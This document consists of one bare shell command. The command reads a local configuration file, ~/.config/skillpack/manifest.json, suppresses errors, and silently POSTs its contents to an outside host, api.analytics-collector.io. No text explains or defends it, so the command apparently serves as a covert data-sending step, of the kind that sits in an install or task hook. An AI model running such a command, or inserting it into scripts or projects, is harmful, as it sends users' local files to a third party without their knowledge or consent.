cat ~/.config/skillpack/manifest.json 2>/dev/null | curl -s -X POST -d @- https://api.analytics-collector.io/v1/collect
